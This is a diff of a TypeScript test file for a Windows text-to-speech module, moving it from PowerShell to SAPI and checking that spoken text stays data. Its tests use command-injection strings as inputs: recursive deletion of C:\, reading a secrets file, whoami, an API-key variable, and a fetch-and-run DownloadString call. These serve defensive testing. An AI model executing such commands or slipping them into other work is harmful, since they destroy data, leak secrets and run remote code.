@@ -8,29 +8,37 @@
 // first run could not speak one word to a Windows owner, which is most
 // owners.
 //
-// The hardest part is not the speaking. It is that PowerShell takes its
-// script as a STRING, and the thing being spoken will not always be a
-// sentence the app wrote: a spoken reply is model output, and model output is
-// downstream of the person's mail. In PowerShell a backtick is an escape, a
-// dollar is an expansion, and a quote ends the string. So the tests that
-// matter here are the ones about what reaches the command line.
-
+// Since 1.0.3 the voice is SAPI through the engine-exclusion addon, not
+// PowerShell (murage-releases #1). What matters: a voice saved in a bot's
+// settings before 1.0.3 (an id from System.Speech's listing) still names the
+// same voice, and the text reaches SAPI as data, never as markup or a command.
+import { readFileSync } from "node:fs";
 import { describe, expect, it } from "vitest";
 
-import { listWindowsVoices, parseVoiceList, synthesizeWindows, windowsVoicesAvailable } from "./windows-voices.ts";
+import { listWindowsVoices, synthesizeWindows, voiceOf, windowsVoicesAvailable, type WindowsSpeech } from "./windows-voices.ts";
 
-/** Captures the argv instead of running anything. No PowerShell exists on the
- *  machine this suite runs on, which is the point: the seam is injectable so
- *  the Windows path is testable from a Mac. */
-function recorder(stdout = "") {
-  const calls: Array<{ file: string; args: string[] }> = [];
-  return {
-    calls,
-    run: async (file: string, args: string[]) => {
-      calls.push({ file, args });
-      return { stdout };
+// What System.Speech listed on a stock Windows 11 (VoiceInfo.Name, Culture.Name, Description), the shape the 1.0.2 PowerShell
+// listing printed one per line as "<Name>\t<Culture>\t<Description>". The Name is the id a bot's settings hold.
+const SYSTEM_SPEECH_ROWS = [
+  ["Microsoft David Desktop", "en-US", "Microsoft David Desktop - English (United States)"],
+  ["Microsoft Zira Desktop", "en-US", "Microsoft Zira Desktop - English (United States)"],
+  ["Microsoft Hedda Desktop", "de-DE", "Microsoft Hedda Desktop - German"],
+] as const;
+// The 1.0.2 listing's own parse of those lines: what a bot could have saved.
+const SAVED_IDS = SYSTEM_SPEECH_ROWS.map(([name, culture, description]) => `${name}\t${culture}\t${description}`.split("\t")[0]!.trim());
+
+function fakeSpeech(rows = SYSTEM_SPEECH_ROWS.map(([name, culture, description]) => ({ name, culture, description }))) {
+  const spoken: Array<{ text: string; voice: string; path: string }> = [];
+  const speech: WindowsSpeech = {
+    speechVoices: async () => rows,
+    speechToWave: async (text, voice, path) => {
+      spoken.push({ text, voice, path });
+      const { writeFile } = await import("node:fs/promises");
+      await writeFile(path, Buffer.from("RIFF....WAVEfmt "));
+      return rows.some((row) => row.name === voice);
     },
   };
+  return { spoken, speech: () => speech };
 }
 
 describe("where the zero-key voice exists", () => {
@@ -41,97 +49,56 @@ describe("where the zero-key voice exists", () => {
   });
 });
 
-describe("what reaches the command line", () => {
-  // THE ONE THAT MATTERS.
-  //
-  // Every one of these is a live PowerShell metacharacter. If the utterance
-  // is ever concatenated into the script, this machine runs it.
-  it("never puts the utterance in the script, whatever is in it", async () => {
-    const hostile = [
-      `'; Remove-Item C:\\ -Recurse -Force; '`,
-      "$(Get-Content C:/secrets.txt)",
-      "`n; whoami",
-      '"; iex (New-Object Net.WebClient).DownloadString(\'http://x\'); "',
-      "$env:FLUX_API_KEY",
-    ].join(" ");
+describe("voices saved before 1.0.3 still resolve", () => {
+  it("lists the same ids System.Speech gave, with the locale and description", async () => {
+    const { speech } = fakeSpeech();
+    const voices = await listWindowsVoices(speech);
+    expect(voices.map((voice) => voice.id)).toEqual(SAVED_IDS);
+    expect(voices[0]).toEqual({ id: "Microsoft David Desktop", label: "Microsoft David Desktop", description: "en-US: Microsoft David Desktop - English (United States)" });
+  });
 
-    const rec = recorder();
-    await synthesizeWindows(hostile, undefined, rec.run).catch(() => undefined);
-    const script = rec.calls[0].args.join(" ");
-
-    // Not one fragment of it is in the script. It travels as base64 and is
-    // decoded inside PowerShell, where it is data in a variable and never
-    // parsed as a command.
-    for (const fragment of ["Remove-Item", "whoami", "DownloadString", "FLUX_API_KEY", "Get-Content C:/secrets"]) {
-      expect.soft(script, `"${fragment}" reached the command line`).not.toContain(fragment);
+  it("speaks a saved id with that very voice, not the default", async () => {
+    const { speech, spoken } = fakeSpeech();
+    for (const id of SAVED_IDS) {
+      const audio = await synthesizeWindows("hello", id, speech);
+      expect(audio.mime).toBe("audio/wav");
+      expect(Buffer.from(audio.bytes).toString("ascii", 0, 4)).toBe("RIFF");
     }
-    expect(script).toContain("FromBase64String");
-    // ...and it really is the same text, so the guard did not eat the voice.
-    const encoded = /FromBase64String\('([^']+)'\)/.exec(script)?.[1] ?? "";
-    expect(Buffer.from(encoded, "base64").toString("utf8")).toBe(hostile);
+    expect(spoken.map((call) => call.voice)).toEqual(SAVED_IDS);
   });
 
-  it("escapes a voice name that closes the quote", async () => {
-    const rec = recorder();
-    // A voice name is chosen from a list, but the list comes off the machine
-    // and a name is still a string somebody else wrote.
-    const voice = "Ha'ck'; whoami; '";
-    await synthesizeWindows("hello", voice, rec.run).catch(() => undefined);
-    const script = rec.calls[0].args.join(" ");
-
-    // NOT an assertion that "; whoami;" is absent. It is present, and it is
-    // supposed to be: it survives as inert text inside a quoted string, the
-    // same way a rude subject line survives into a brief. What matters is
-    // that it can never STOP being text, and the only character that could
-    // end that string is a single quote. So the assertion is that every one
-    // of them was doubled, which is PowerShell's documented escape.
-    expect(script).toContain(`'${voice.split("'").join("''")}'`);
-
-    // The same thing said structurally: strip the escapes and no bare quote
-    // is left, so the literal cannot be closed early.
-    const literal = /SelectVoice\((.*?)\) \} catch/.exec(script)?.[1] ?? "";
-    expect(literal.length).toBeGreaterThan(2);
-    expect(literal.slice(1, -1).split("''").join("")).not.toContain("'");
+  it("an unknown or empty id is the machine's default voice, never silence", async () => {
+    const { speech, spoken } = fakeSpeech();
+    await synthesizeWindows("hello", "A Voice Removed Since", speech);
+    await synthesizeWindows("hello", undefined, speech);
+    await synthesizeWindows("hello", "  ", speech);
+    expect(spoken.map((call) => call.voice)).toEqual(["A Voice Removed Since", "", ""]);
   });
 
-  it("runs without a profile, so a banner cannot become a voice list", async () => {
-    const rec = recorder();
-    await listWindowsVoices(rec.run);
-    expect(rec.calls[0].file).toBe("powershell");
-    expect(rec.calls[0].args).toContain("-NoProfile");
-    // A prompt would hold the turn open until the timeout instead of failing.
-    expect(rec.calls[0].args).toContain("-NonInteractive");
-  });
-
-  it("says nothing at all rather than spawning for an empty utterance", async () => {
-    const rec = recorder();
-    const audio = await synthesizeWindows("   ", undefined, rec.run);
-    expect(rec.calls).toHaveLength(0);
-    expect(audio.bytes.length).toBe(0);
+  it("a nameless voice row is left out; a machine that cannot answer has no voices", async () => {
+    expect(voiceOf({ name: " ", culture: "en-US", description: "x" })).toBeNull();
+    const broken: WindowsSpeech = { speechVoices: async () => { throw new Error("SAPI unavailable"); }, speechToWave: async () => false };
+    expect(await listWindowsVoices(() => broken)).toEqual([]);
+    expect(await listWindowsVoices(() => { throw new Error("no addon"); })).toEqual([]);
   });
 });
 
-describe("reading the installed voices", () => {
-  it("takes the name, the locale and the sample", () => {
-    const voices = parseVoiceList(
-      "Microsoft David Desktop\ten-US\tMicrosoft David Desktop - English (United States)\n"
-      + "Microsoft Zira Desktop\ten-US\tMicrosoft Zira Desktop - English (United States)\n",
-    );
-    expect(voices).toHaveLength(2);
-    expect(voices[0]).toMatchObject({ id: "Microsoft David Desktop", label: "Microsoft David Desktop" });
-    expect(voices[0].description).toContain("en-US");
+describe("what reaches the speech engine", () => {
+  it("hands the utterance over unchanged, as data: no command line, no quoting, no markup step", async () => {
+    const hostile = [`'; Remove-Item C:\\ -Recurse -Force; '`, "$(Get-Content C:/secrets.txt)", "`n; whoami", '<volume level="0">quiet</volume>', "$env:FLUX_API_KEY"].join(" ");
+    const { speech, spoken } = fakeSpeech();
+    await synthesizeWindows(`  ${hostile}  `, "Microsoft Zira Desktop", speech);
+    expect(spoken[0]!.text).toBe(hostile);
+    expect(spoken[0]!.path).toMatch(/murage-say-.*utterance\.wav$/);
+    // the module starts nothing: no child process, no PowerShell
+    const source = readFileSync(new URL("./windows-voices.ts", import.meta.url), "utf8");
+    expect(source).not.toMatch(/child_process|execFile|spawn\(/);
+    expect(source.split("\n").filter((line) => !line.trimStart().startsWith("//")).join("\n")).not.toMatch(/powershell/i);
   });
 
-  it("ignores a blank line rather than inventing a nameless voice", () => {
-    expect(parseVoiceList("\n  \nMicrosoft David\ten-US\tA voice\n")).toHaveLength(1);
-  });
-
-  // Same contract as the Mac path: a machine that cannot answer has no
-  // voices, rather than an error every call site has to handle.
-  it("answers no voices when PowerShell is not there", async () => {
-    const run = async () => {
-      throw new Error("spawn powershell ENOENT");
-    };
-    await expect(listWindowsVoices(run)).resolves.toEqual([]);
+  it("an empty utterance is empty audio, with nothing spoken", async () => {
+    const { speech, spoken } = fakeSpeech();
+    expect((await synthesizeWindows("   ", "Microsoft David Desktop", speech)).bytes.length).toBe(0);
+    expect(spoken).toEqual([]);
   });
 });
